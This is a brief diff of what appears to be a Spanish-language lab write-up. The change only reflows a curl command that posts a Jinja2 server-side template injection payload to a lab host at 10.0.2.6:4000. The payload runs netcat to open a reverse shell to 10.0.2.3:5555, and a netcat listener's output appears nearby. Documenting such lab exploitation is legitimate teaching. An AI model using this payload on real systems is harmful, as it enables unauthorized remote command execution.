@@ -658,8 +658,7 @@ listening on [any] 5555 ...
 </pre>
 
 <pre class="term-log">
-<span class="cmd">$ curl -s -b ssti_cookies.txt -X POST --data-urlencode 'event_name=Test' --data-urlencode 'date=2026-09-15' --data-urlencode 'location=Madrid' --data-urlencode "description={{ self.__init__.__globals__.__builtins__.__import__('os').popen('nc 10.0.2.3 5555 -e /bin/bash').read() }}" \
-  http://10.0.2.6:4000/event</span>
+<span class="cmd">$ curl -s -b ssti_cookies.txt -X POST --data-urlencode 'event_name=Test' --data-urlencode 'date=2026-09-15' --data-urlencode 'location=Madrid' --data-urlencode "description={{ self.__init__.__globals__.__builtins__.__import__('os').popen('nc 10.0.2.3 5555 -e /bin/bash').read() }}" http://10.0.2.6:4000/event</span>
 </pre>
 
 **Desglose de la técnica:**
